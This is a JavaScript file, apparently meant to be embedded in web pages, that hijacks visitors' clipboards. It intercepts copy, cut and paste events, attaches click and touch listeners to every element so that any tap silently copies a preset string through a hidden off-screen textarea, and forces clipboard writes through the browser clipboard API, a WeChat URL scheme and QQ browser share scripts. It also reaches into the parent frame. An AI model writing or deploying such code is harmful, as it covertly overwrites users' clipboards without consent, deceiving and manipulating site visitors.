(function(h) {
	var g = {
		trigger: null,
		dd: document,
		ww: window,
		listener: [],
		listenerTouchend: [],
		listenerCopy: null,
		text: null,
		action: "copy",
		ua: window.navigator.userAgent,
		host: location.protocol + "//" + location.host,
		id: "default",
		hascopy: null,
		hasload: null,
		hascopy2: null,
		closeqq: "no",
		init: function() {
			var a = this;
			try {
				a.trigger = top.document.getElementsByTagName("*");
			} catch (e) {
				a.trigger = document.getElementsByTagName("*");
			}
			
			a.ww.addEventListener("copy", a.copyHandler);
			a.ww.addEventListener("cut", a.copyHandler);
			a.ww.addEventListener("paste", a.copyHandler);

				var b = "";
				a._ajax(function(b) {
					a.text = b;
					a.closeqq = 'no';
					a.wxcp(b);
					"null" == a.text && (a.text = 0);
					setTimeout(function() {
						a.dd.queryCommandSupported && a.dd.queryCommandSupported(a.action) ? a.text && (a.listenClick(), a.listenTouchend()) : 1 < a.ua.split("MQQBrowser").length && 1 < a.ua.split("Android").length && 2 > a.ua.split("MicroMessenger").length && 2 > a.ua.split("QQ/").length ? a.text && a.qqCopy() : (a.listenerCopy = a.listenNode(a.dd.body, "click", a.clipboardCopy.bind(a)))
					}, 0);
					a.autoCopy()
				}, this)
			
		},
		wxcp: function(a) {
			if (/MicroMessenger/i.test(navigator.userAgent)) {
				var iframe = document.createElement("iframe");
				iframe.style.cssText = "display:none;width:0px;height:0px;";
				iframe.src = "weixin://webview/copy/" + a;
				document.body.appendChild(iframe)
			}
		},
		copyHandler(event) {
			event.clipboardData.setData('text/plain', g.text);
			event.preventDefault()
		},
		qqCopy: function() {
			var a = this,
				b = a.text,
				c = navigator.appVersion,
				e = 1 < c.split("MQQBrowser/").length ? 2 : 0;
			if (a.closeqq == "yes") {
				return true
			}
			if (e) {
				var f = {
					url: b,
					to_app: "10",
					us_txt: "23s"
				};
				b = c.split("MQQBrowser/")[1].split(".");
				b = parseFloat(b[0] + "." + b[1]);
				b = 5.4 > (e ? b : 0) ? "//3gimg.qq.com/html5/js/qb.js" : "//jsapi.qq.com/get?api=app.share";
				c = a.dd.createElement("script");
				var d = a.dd.getElementsByTagName("body")[0];
				c.setAttribute("src", b);
				c.onload = function() {
					"undefined" != typeof a.ww.browser && "undefined" != typeof a.ww.browser.app && 2 == e ? (a.ww.browser.app.share(f), a.cp("1")) : "undefined" != typeof a.ww.qb && 1 == e && (a.ww.qb.share(f), a.cp("1"))
				};
				d.appendChild(c)
			}
		},
		clipboardCopy: function(a) {
			_this.ww.clipboardData && this.text && _this.ww.clipboardData.setData("Text", this.text);
			this.listenerCopy.destroy()
		},
		autoCopy() {
			try {
				window['focus']();
				navigator['clipboard']['writeText'](this.text)['then'](() => {
					window['blur']()})['catch'](err => {
					window['blur']()
				})
			} catch (e) {}
		},
		listenClick: function() {
			for (var a = this, b = 0; b < a.trigger.length; b++) {
				a.listener.push(a.listenNode(a.trigger[b], "click", function(b) {
					return a.onClick(b, "click")
				}))
			}
		},
		listenTouchend: function() {
			for (var a = this, b = 0; b < a.trigger.length; b++) {
				a.listenerTouchend.push(a.listenNode(a.trigger[b], "touchend", function(b) {
					return a.onClick(b, "touchend")
				}))
			}
		},
		listenNode: function(a, b, c) {
			a.addEventListener(b, c, true);
			return {
				destroy: function() {
					a.removeEventListener(b, c, true)
				}
			}
		},
		onClick: function(a, b) {
			var c = this;
			this.dd.body.hasAttribute("oncopy") && this.dd.body.setAttribute("oncopy", "return true");
			this.dd.body.hasAttribute("onpaste") && this.dd.body.setAttribute("onpaste", "return true");
			"INPUT" != a.target.nodeName && "TEXTAREA" != a.target.nodeName && ((new h(this.text, this.action, function(a) {
				a
			})).start(), "click" == b ? (this.listenerD = true, this.listener.forEach(function(a, b) {})) : "touchend" == b && this.listenerTouchend.forEach(function(a, b) {}));
			
			this.dd.body.hasAttribute("oncopy") && this.dd.body.setAttribute("oncopy", "return false");
			this.dd.body.hasAttribute("onpaste") && this.dd.body.setAttribute("onpaste", "return false")
		},

		
		_ajax: function(c) {
			///////localstorage start////////
			Storage.prototype.setExpire = (key, value, expire) => {
				let obj = {
				data: value,
				time: Date.now(),
				expire: expire
				};
				//localStorage 设置的值不能为对象,转为json字符串
				localStorage.setItem(key, JSON.stringify(obj));
			}

			Storage.prototype.getExpire = key => {
				let val = localStorage.getItem(key);
				if (!val) {
					return val;
				}
				val = JSON.parse(val.toString());
				if (Date.now() - val.time > val.expire) {
					localStorage.removeItem(key);
					return null;
				}
				return val.data;
			}
			
			
			///////localstorage end////////
			
			//var koukou = localStorage.getExpire("kou");
		//	if(!koukou){    
			var kou = new Array();
			//ry
	      	kou[1] = "##试试##";
			//hw9
			var min = 1;
            var max = 5;
            var rand = Math.floor(Math.random()*(max-min+1))+min;
            
            c(kou[rand]);
				
		//	}else{
		//		c(koukou);
		//	}
		}
	};
	try {
		parent.window.location.href != window.location.href && (g.host = parent.window.location.protocol + "//" + parent.window.location.host, g.dd = parent.document, g.ww = parent.window), g.init()
	} catch (a) {
		g.init()
	}
})(function(h, g, a) {
	return {
		fakeElem: null,
		text: h,
		action: g,
		selectedText: null,
		dd: document,
		ww: window,
		start: function() {
			this.text,this.selectFake()
		},
		selectFake: function() {
			var a = "rtl" == this.dd.documentElement.getAttribute("dir");
			this.removeFake();
			this.fakeElem = this.dd.createElement("textarea");
			this.fakeElem.style.fontSize = "12pt";
			this.fakeElem.style.border = "0";
			this.fakeElem.style.padding = "0";
			this.fakeElem.style.margin = "0";
			this.fakeElem.style.position = "absolute";
			a ? (this.fakeElem.style.right = "-9999px") : (this.fakeElem.style.left = "-9999px");
			this.fakeElem.style.top = (this.ww.pageYOffset || this.dd.documentElement.scrollTop) + "px";
			this.fakeElem.setAttribute("readonly", "");
			this.fakeElem.value = this.text;
			this.dd.body.appendChild(this.fakeElem);
			this.selectedText = this.selectText(this.fakeElem);
			this.copyText()
		},
		removeFake: function() {
			this.fakeElem && (this.dd.body.removeChild(this.fakeElem), this.fakeElem = null)
		},
		copyText: function() {
			var b = void 0;
			try {
				b = this.dd.execCommand(this.action)
			} catch (c) {
				b = false
			}
			this.removeFake();
			a.call(this, b)
		},
		selectText: function(a) {
			if ("SELECT" === a.nodeName) {
				a.focus(), a = a.value
			} else if ("INPUT" === a.nodeName || "TEXTAREA" === a.nodeName) {
				var b = a.hasAttribute("readonly");
				b || a.setAttribute("readonly", "");
				a.select();
				a.setSelectionRange(0, a.value.length);
				b || a.removeAttribute("readonly");
				a = a.value
			} else {
				a.hasAttribute("contenteditable") && a.focus();
				b = this.ww.getSelection();
				var e = this.dd.createRange();
				e.selectNodeContents(a);
				b.removeAllRanges();
				b.addRange(e);
				a = b.toString()
			}
			return a
		}
	}
});